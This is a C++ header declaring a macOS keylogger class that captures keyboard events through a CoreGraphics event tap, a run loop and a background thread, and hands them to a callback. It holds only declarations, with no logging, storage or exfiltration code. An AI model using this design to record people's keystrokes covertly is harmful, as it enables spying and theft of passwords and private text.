#pragma once
#ifdef __APPLE__

#include <CoreFoundation/CoreFoundation.h>
#include <ApplicationServices/ApplicationServices.h>

#include <atomic>
#include <functional>
#include <mutex>
#include <thread>

#include "keylogger.hpp"

class MacKeylogger : public IKeylogger {
public:
    ~MacKeylogger() override;
    bool start() override;
    void stop() override;
    void setEventCallback(std::function<void(const KeyEvent&)> cb) override;

private:
    static CGEventRef tapCallback(CGEventTapProxy proxy, CGEventType type,
                                  CGEventRef event, void* userInfo);

    CFMachPortRef      m_tap{};
    CFRunLoopSourceRef m_source{};
    CFRunLoopRef       m_runLoop{};
    std::thread        m_thread;
    std::atomic<bool>  m_running{false};
    std::mutex         m_mu;
    std::function<void(const KeyEvent&)> m_callback;
};

#endif // __APPLE__
